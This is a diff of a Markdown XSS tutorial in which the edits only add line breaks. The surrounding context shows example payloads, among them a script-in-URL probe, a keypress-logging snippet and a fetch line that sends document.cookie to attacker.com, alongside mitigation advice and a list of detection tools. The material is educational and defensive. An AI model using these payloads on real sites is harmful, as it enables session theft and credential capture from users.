@@ -60,7 +60,8 @@ https://example.com/#<script>alert('XSS')</script>
 ```
 
 - Use Cases for Attack
-  - Exploiting insecure JavaScript handling of user input.
+  - Exploiting insecure JavaScript handling of user input.  
+<br>
 
 ## 2. Using \<img> Tags in XSS Attacks
   - \<img> tags can be used to **load external resources or execute scripts** indirectly by exploiting cross-origin HTTP requests.
@@ -73,7 +74,8 @@ https://example.com/#<script>alert('XSS')</script>
 
   - Why \<img> Tags Are Effective
     - They don’t require user interaction to trigger.
-    - Browsers automatically fetch the resource, making it a reliable vector for cross-origin requests.
+    - Browsers automatically fetch the resource, making it a reliable vector for cross-origin requests.  
+<br>
 
 ## 3. Common XSS Attack Payloads
   - Stealing Cookies  
@@ -99,7 +101,8 @@ document.onkeypress = function(e) {
 fetch("https://example.com/logout");
 fetch("https://attacker.com/steal?session=" + document.cookie);
 </script>
-```
+```  
+<br>
 
 ## 4. Mitigating XSS
 
@@ -138,7 +141,8 @@ Set-Cookie: sessionId=abc123; HttpOnly; Secure
 ```
 
 ### e. Avoid Dangerous Practices
-  - Avoid directly inserting untrusted input into the DOM using innerHTML, document.write, or eval.
+  - Avoid directly inserting untrusted input into the DOM using innerHTML, document.write, or eval.  
+<br>
 
 ## 5. Detection Tools for XSS Vulnerabilities
 
@@ -147,7 +151,8 @@ Set-Cookie: sessionId=abc123; HttpOnly; Secure
 | Burp Suite | Automated scanning for XSS vulnerabilities in web applications. |
 | OWASP ZAP | Open-source tool to detect XSS and other web vulnerabilities. |
 | Acunetix | Comprehensive security scanner for web applications. |
-| DOM Snitch | A Chrome extension to detect DOM-based XSS vulnerabilities. |
+| DOM Snitch | A Chrome extension to detect DOM-based XSS vulnerabilities. |  
+<br>
 
 ## 6. Summary of XSS Types
 
@@ -155,7 +160,8 @@ Set-Cookie: sessionId=abc123; HttpOnly; Secure
 | ---- | ----------- | ------- |
 | Reflected XSS | Malicious script is reflected off the server and executed in the victim’s browser. | Payload in URL query parameters. |
 | Persistent XSS | Malicious script is stored on the server and served to all users viewing the affected resource. | Injected into comment fields or user profiles. |
-| DOM-Based XSS | Malicious script is executed in the client’s browser without server involvement. | Exploits insecure JavaScript like innerHTML or location.hash. |
+| DOM-Based XSS | Malicious script is executed in the client’s browser without server involvement. | Exploits insecure JavaScript like innerHTML or location.hash. |  
+<br>
 
 ## 7. Best Practices to Prevent XSS
 1. Use a Framework with Built-in Security
@@ -167,7 +173,8 @@ Set-Cookie: sessionId=abc123; HttpOnly; Secure
 4. Escape and Encode Output
   - Encode all dynamic data before rendering.
 5. Train Developers
-  - Educate developers about XSS risks and secure coding practices.
+  - Educate developers about XSS risks and secure coding practices.  
+<br>
 
 ## Summary
 **XSS attacks exploit web applications to execute malicious scripts in a user’s browser, leading to data theft, session hijacking, or worse**. Understanding the different types of XSS (Reflected, Persistent, DOM-Based) and employing robust mitigation strategies—such as input validation, CSP, and output encoding—are essential for securing modern web applications against this pervasive threat.  
